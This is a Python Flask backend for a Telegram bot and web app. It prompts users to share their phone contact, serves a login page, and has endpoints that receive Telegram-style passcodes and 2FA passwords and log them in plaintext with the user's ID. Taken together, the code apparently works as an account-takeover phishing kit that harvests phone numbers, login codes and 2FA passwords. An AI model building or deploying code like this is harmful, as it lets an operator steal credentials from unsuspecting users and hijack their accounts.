from flask import Flask, request, jsonify, render_template
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("❌ BOT_TOKEN not set")

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
APP_URL = os.environ.get("APP_URL", "https://tgbot-gllp.onrender.com")

# === SETUP WEBHOOK ===
@app.route("/setup_webhook")
def setup_webhook():
    webhook_url = f"{APP_URL}/"
    response = requests.post(f"{TELEGRAM_API}/setWebhook", json={"url": webhook_url})
    return jsonify(response.json())

# === MAIN WEBHOOK ===
@app.route("/", methods=["POST"])
def webhook():
    update = request.get_json(force=True, silent=True)
    print("=" * 60, flush=True)
    print("📨 Telegram update:", update, flush=True)
    print("=" * 60, flush=True)

    if not update or "message" not in update:
        return jsonify({"ok": True})

    message = update["message"]
    chat_id = message["chat"]["id"]
    text = message.get("text", "")

    # Handle /start command
    if text == "/start":
        webapp_url = f"{APP_URL}/webapp"
        reply_markup = {
            "keyboard": [
                [{"text": "🌐 Open WebApp", "web_app": {"url": webapp_url}}],
                [{"text": "📞 Share Contact", "request_contact": True}]
            ],
            "resize_keyboard": True,
            "one_time_keyboard": False
        }

        payload = {
            "chat_id": chat_id,
            "text": "👋 Welcome!\n\nYou can either open the WebApp or share your contact:",
            "reply_markup": reply_markup
        }
        res = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)
        print("📤 Sent /start message:", res.text, flush=True)

    # Handle contact shared by user
    elif "contact" in message:
        contact = message["contact"]
        phone = contact.get("phone_number")
        name = contact.get("first_name")
        requests.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": chat_id,
            "text": f"📱 Thanks {name}! Your number {phone} was received."
        })
        print(f"✅ Received contact: {name} ({phone})", flush=True)

    return jsonify({"ok": True})


# === FRONTEND ROUTES ===
@app.route("/webapp")
def webapp_page():
    return render_template("index.html")

@app.route("/login")
def login_page():
    return render_template("login.html")


# === DATA ENDPOINTS ===
@app.route("/send_data", methods=["POST"])
def send_data():
    data = request.get_json()
    user_id = data.get("user_id")
    passcode = data.get("passcode")

    print(f"📩 Passcode received from {user_id}: {passcode}", flush=True)

    if user_id and passcode:
        requests.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": user_id,
            "text": "✅ Passcode received!"
        })

    return jsonify({"ok": True})


@app.route("/send_twofactor", methods=["POST"])
def send_twofactor():
    data = request.get_json()
    user_id = data.get("user_id")
    twofactor = data.get("twofactor")

    print(f"🔐 2FA from {user_id}: {twofactor}", flush=True)

    if user_id and twofactor:
        requests.post(f"{TELEGRAM_API}/sendMessage", json={
            "chat_id": user_id,
            "text": "🔐 2FA password received!"
        })

    return jsonify({"ok": True})


@app.route("/status")
def status():
    return f"""
    <h1>Telegram Bot Server</h1>
    <p>✅ BOT_TOKEN set</p>
    <p>🌐 WebApp: <a href="{APP_URL}/webapp">{APP_URL}/webapp</a></p>
    <hr>
    <a href="/setup_webhook">Setup Webhook</a>
    """


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
